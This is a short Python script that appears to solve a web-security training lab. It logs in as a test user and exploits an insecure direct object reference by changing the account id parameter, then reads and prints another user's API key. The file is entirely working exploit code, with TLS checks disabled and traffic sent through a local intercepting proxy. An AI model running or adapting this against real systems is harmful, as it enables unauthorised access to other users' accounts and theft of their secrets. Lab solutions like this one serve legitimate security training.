import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def get_csrf_token(session, url):
    res = session.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(res.text, 'html.parser')
    csrf = soup.find("input", {'name': 'csrf'})["value"]
    return csrf

def get_api(session, url):
    # Get csrf token
    login_url = url + "/login"
    csrf_token = get_csrf_token(session, login_url)

    # Login as the wiener user
    print("(+) Logging in as the wiener user...")
    login_data = {'csrf': csrf_token, 'username': 'wiener', 'password': 'peter'}
    res = session.post(login_url, data=login_data, verify=False, proxies=proxies)
    if "Log out" in res.text:
        print("(+) Successfully logged in as the wiener user.")
        
        # Exploit access control vulnerabilities and access carlos api key
        carlos_api_url = url + "/my-account?id=carlos"
        res = session.get(carlos_api_url, verify=False, proxies=proxies)
        if "carlos" in res.text:
            print("(+) Sucessfully accessed Carlos's account!")
            print("(+) Retrieving the API key...")
            api_key = re.search("Your API Key is: (.*)</div>", res.text).group(1)
            print("(+) API Key is: " + api_key)
        else:
            print("(-) Unable to access Carlos Account!")
            sys.exit(-1)

    else:
        print("(-) Could not login as the wiener user.")
        sys.exit(-1)


def main():
    if len(sys.argv) != 2:
        print(f"(+) Usage: python {sys.argv[0]} <url>")
        print(f"(+) Example: python {sys.argv[0]} https://www.example.com")
        sys.exit(-1)

    session = requests.session()
    url = sys.argv[1].strip()
    get_api(session, url)


if __name__ == "__main__":
    main()